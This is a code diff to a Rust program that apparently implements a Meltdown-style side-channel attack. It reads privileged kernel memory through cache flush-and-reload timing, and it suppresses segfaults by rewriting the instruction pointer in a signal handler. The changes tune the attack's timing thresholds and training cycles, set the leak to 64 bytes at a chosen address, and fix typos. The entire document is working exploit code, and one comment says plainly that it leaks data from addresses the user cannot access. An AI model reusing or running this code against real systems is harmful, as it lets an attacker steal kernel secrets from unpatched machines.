@@ -2,11 +2,13 @@
 
 use nix::sys::mman;
 use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
+use std::convert::TryFrom;
 
 const MULTIPLE_OFFSET: usize = 8192;
 const CACHE_LINE_SIZE: usize = 4096;
+const NB_CYCLES_TRAIN: u64 = 1000;
 const NB_TIMES: usize = 1000;
-const ZERO_TRESHOLD: usize = 970;
+const ZERO_TRESHOLD: usize = 997;
 
 static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
     [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
@@ -35,13 +37,15 @@ extern "C" fn handle_sigsegv(
     arg: *mut libc::c_void,
 ) {
     let mut context = unsafe { (arg as *mut libc::ucontext_t).as_mut().unwrap() };
+    // very verbose, only uncomment if you want to see that you're leaking data from privileged
+    // addresses that you cannot access
     /*
     let offending_address =
         unsafe { (*info)._pad[1] as usize | (((*info)._pad[2] as usize) << 32) };
     println!(
         "Got {:?} with offending_addres 0x{:x}, ignoring",
         Signal::try_from(signal).unwrap(),
-        offensing_address
+        offending_address
     );
     */
     // overwrite RIP to jump to our trampoline (REG_RIP = 16)
@@ -87,7 +91,7 @@ unsafe fn perform_access(
         let mut histogram = [0usize; 256];
 
         for _ in 0..NB_TIMES {
-            // prelaod data
+            // preload data
             preload_op();
 
             // flush
@@ -101,7 +105,7 @@ unsafe fn perform_access(
             let target_adress = target_adress as usize + i;
 
             asm!(
-                "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]", 
+            "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]", "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",  "mov rax, rcx", "movzx rax, byte ptr [rax]",
                 "mov rax, {0}", "movzx rax, byte ptr [rax]", "imul rax, {2}", "add rax, {1}", "movzx rcx, byte ptr [rax]",
                  // nop sled for the signal handler to skip the access upon segfault
                  "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
@@ -112,6 +116,7 @@ unsafe fn perform_access(
         }
 
         if histogram[0] > ZERO_TRESHOLD {
+            //println!("{:?}", histogram);
             res.push(0);
         } else {
             res.push(
@@ -171,19 +176,19 @@ fn main() {
 
         std::ptr::read_volatile(BASE_ADDR as *const u8);
         let mut read_cached_time = 0;
-        for _ in 0..100 {
+        for _ in 0..NB_CYCLES_TRAIN {
             read_cached_time += measure_time_to_read(BASE_ADDR);
         }
-        read_cached_time /= 100;
+        read_cached_time /= NB_CYCLES_TRAIN;
 
         let mut read_flushed_time = 0;
-        for _ in 0..100 {
+        for _ in 0..NB_CYCLES_TRAIN {
             std::arch::x86_64::_mm_clflush(BASE_ADDR as *mut u8);
             read_flushed_time += measure_time_to_read(BASE_ADDR);
         }
-        read_flushed_time /= 100;
+        read_flushed_time /= NB_CYCLES_TRAIN;
 
-        NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 3;
+        NB_CYCLES = read_cached_time + (read_flushed_time - read_cached_time) / 2;
 
         println!(
             "time to read a:\n- cached entry: {}\n- cold entry: {}\nFixing the treshold at {} cycles",
@@ -195,14 +200,15 @@ fn main() {
     let addr = usize::from_str_radix(&args[1][2..], 16).unwrap();
 
     unsafe {
+        println!("Trying to read 64 bytes at 0x{:x}", addr);
         let bytes = perform_access(
             || {
                 std::fs::read_to_string("/proc/version").unwrap();
             },
             addr as *const u8,
-            128,
+           64,
         );
-        println!("{:?}", bytes);
-        println!("{}", std::str::from_utf8_unchecked(&bytes));
+        println!("Bytes read: {:?}", bytes);
+        println!("String representation: \"{}\"", std::str::from_utf8_unchecked(&bytes));
     }
 }
